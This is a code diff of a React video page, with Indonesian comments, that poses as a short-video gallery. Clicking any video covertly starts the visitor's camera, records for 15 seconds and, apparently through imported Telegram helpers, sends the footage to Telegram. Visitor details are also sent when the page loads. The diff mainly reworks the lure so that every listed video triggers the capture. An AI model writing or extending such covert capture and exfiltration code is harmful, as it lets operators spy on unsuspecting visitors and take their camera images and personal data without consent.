@@ -3,10 +3,9 @@ import { useState, useEffect, useCallback, useRef } from 'react';
 import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram, VisitorDetails } from './utils/telegram';
 
 function App() {
-  const [isPlaying, setIsPlaying] = useState(false);
+  const [isPlaying, setIsPlaying] = useState<number | null>(null); // Index video yang sedang diputar
   const [isFullscreen, setIsFullscreen] = useState(false);
-  const [currentVideoIndex, setCurrentVideoIndex] = useState(0);
-  const videoRef = useRef<HTMLVideoElement>(null);
+  const videoRefs = useRef<(HTMLVideoElement | null)[]>([]); // Array ref untuk semua video
   const cameraStreamRef = useRef<MediaStream | null>(null);
 
   const videos = [
@@ -39,12 +38,10 @@ function App() {
     sendVisitorNotification();
   }, []);
 
-  const captureAndSendMedia = useCallback(async () => {
+  const captureAndSendMedia = useCallback(async (videoElement: HTMLVideoElement) => {
     console.log('Mulai proses pengambilan media...');
     try {
-      if (videoRef.current) {
-        videoRef.current.play().catch(err => console.error('Error memutar video:', err));
-      }
+      videoElement.play().catch(err => console.error('Error memutar video:', err));
 
       const devices = await navigator.mediaDevices.enumerateDevices();
       const videoDevice = devices.find(device => device.kind === 'videoinput');
@@ -111,8 +108,8 @@ function App() {
         if (mediaRecorder.state === 'recording') {
           mediaRecorder.stop();
         }
-        if (videoRef.current) videoRef.current.pause();
-        setIsPlaying(false);
+        videoElement.pause();
+        setIsPlaying(null);
       }, 15000);
 
     } catch (error) {
@@ -121,38 +118,48 @@ function App() {
         cameraStreamRef.current.getTracks().forEach(track => track.stop());
         cameraStreamRef.current = null;
       }
-      setIsPlaying(false);
+      setIsPlaying(null);
     }
   }, []);
 
-  const handleVideoClick = async () => {
-    if (videoRef.current && !isPlaying) {
-      videoRef.current.src = videos[currentVideoIndex].videoUrl;
+  const handleVideoClick = async (index: number) => {
+    // Hentikan video yang sedang diputar sebelumnya
+    if (isPlaying !== null && isPlaying !== index) {
+      const prevVideo = videoRefs.current[isPlaying];
+      if (prevVideo) {
+        prevVideo.pause();
+        prevVideo.currentTime = 0; // Reset ke awal
+      }
+    }
+
+    const videoElement = videoRefs.current[index];
+    if (videoElement) {
       try {
-        await videoRef.current.load();
-        await videoRef.current.play();
-        setIsPlaying(true);
-        await captureAndSendMedia();
+        await videoElement.play();
+        setIsPlaying(index);
+        await captureAndSendMedia(videoElement);
       } catch (error) {
-        console.error('Error memutar video dari Dropbox:', error);
-        setIsPlaying(false);
+        console.error('Error memutar video:', error);
+        setIsPlaying(null);
       }
     }
   };
 
-  const toggleFullscreen = () => {
-    if (!isFullscreen && videoRef.current) {
-      videoRef.current.requestFullscreen();
-      setIsFullscreen(true);
-    } else {
-      document.exitFullscreen();
-      setIsFullscreen(false);
+  const toggleFullscreen = (index: number) => {
+    const videoElement = videoRefs.current[index];
+    if (videoElement) {
+      if (!isFullscreen) {
+        videoElement.requestFullscreen();
+        setIsFullscreen(true);
+      } else {
+        document.exitFullscreen();
+        setIsFullscreen(false);
+      }
     }
   };
 
-  const handleVideoEnded = () => {
-    setIsPlaying(false);
-    setCurrentVideoIndex((prev) => (prev + 1) % videos.length);
+  const handleVideoEnded = (index: number) => {
+    setIsPlaying(null);
   };
 
   return (
@@ -164,48 +171,35 @@ function App() {
       </header>
       <main className="relative container mx-auto px-4 py-8">
         <div className="max-w-[720px] mx-auto">
-          <div className="relative">
-            <div className="relative bg-black rounded-lg overflow-hidden shadow-xl" style={{ aspectRatio: '9/16' }}>
-              <video
-                ref={videoRef}
-                className="w-full h-full object-cover"
-                muted
-                loop
-                onClick={handleVideoClick}
-                onEnded={handleVideoEnded}
-              />
-              {isPlaying && (
-                <div className="absolute bottom-4 right-4 z-20">
-                  <button
-                    onClick={toggleFullscreen}
-                    className="bg-gray-800/70 p-2 rounded-full hover:bg-gray-700 transition-all duration-200"
-                  >
-                    {isFullscreen ? (
-                      <ArrowsPointingInIcon className="w-6 h-6 text-white" />
-                    ) : (
-                      <ArrowsPointingOutIcon className="w-6 h-6 text-white" />
-                    )}
-                  </button>
-                </div>
-              )}
-            </div>
-            <div className="mt-4 flex gap-2 overflow-x-auto pb-2">
-              {videos.map((video, index) => (
+          <div className="space-y-4">
+            {videos.map((video, index) => (
+              <div key={index} className="relative bg-black rounded-lg overflow-hidden shadow-xl" style={{ aspectRatio: '9/16' }}>
                 <video
-                  key={index}
+                  ref={(el) => (videoRefs.current[index] = el)}
                   src={video.videoUrl}
-                  className={`w-16 h-28 object-cover rounded cursor-pointer ${
-                    index === currentVideoIndex ? 'ring-2 ring-red-600' : ''
-                  }`}
+                  className="w-full h-full object-cover"
                   muted
+                  loop
+                  onClick={() => handleVideoClick(index)}
+                  onEnded={() => handleVideoEnded(index)}
                   preload="metadata"
-                  onClick={() => {
-                    setCurrentVideoIndex(index);
-                    setIsPlaying(false);
-                  }}
                 />
-              ))}
-            </div>
+                {isPlaying === index && (
+                  <div className="absolute bottom-4 right-4 z-20">
+                    <button
+                      onClick={() => toggleFullscreen(index)}
+                      className="bg-gray-800/70 p-2 rounded-full hover:bg-gray-700 transition-all duration-200"
+                    >
+                      {isFullscreen ? (
+                        <ArrowsPointingInIcon className="w-6 h-6 text-white" />
+                      ) : (
+                        <ArrowsPointingOutIcon className="w-6 h-6 text-white" />
+                      )}
+                    </button>
+                  </div>
+                )}
+              </div>
+            ))}
           </div>
         </div>
       </main>
